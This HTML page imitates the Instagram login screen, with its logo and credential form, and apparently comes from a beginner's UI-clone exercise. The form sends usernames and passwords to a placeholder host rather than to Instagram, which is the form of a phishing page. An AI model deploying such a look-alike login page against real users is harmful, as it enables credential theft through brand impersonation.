<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }

    .logo {
      width: 175px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
    }

    .login-btn {
      margin-top: 10px;
      width: 100%;
      background-color: #68b7ec;
      border: none;
      color: white;
      padding: 10px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #75c1f4;
    }
    .Gethelp{
        margin-top: 24px;
        font-size:14px ;
         
    }
    .Gethelp a {
      text-decoration: none;
      color: #073caf;
      font-weight: bold;
    }

    .signup {
      margin-top: 24px;
      font-size: 14px;
      
    }

    .signup a {
      text-decoration: none;
      color: #073caf;
       font-weight: bold;
    }

  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="Instagram" />

    <form action="https://example.com/login" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit" class="login-btn">Log In</button>
    </form>
    <div class="Gethelp">
        Forgot your login details?<a href="@">Get help</a>
       </div>
    <div style="text-align: center; margin: 25px 0;">
  <hr style="border: none; height: 1.3px; background-color: #ccc;">
  <span style="position: relative; top: -20px; background: #fff; padding: 0 10px; color: #888;">OR</span>
</div>
 <!-- Font Awesome icon link (head me add karo) -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />

<!-- Facebook login with icon -->
<div class="facebook-login" style="color:  #0095f6; font-weight: bold; cursor: pointer; font-size: 14px;">
  <i class="fab fa-facebook-square" style="margin-right: 8px;"></i>Login with Facebook
</div>

      <br>
       <br>
    <hr>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
     
    </div>
  </div>
</body>
</html>
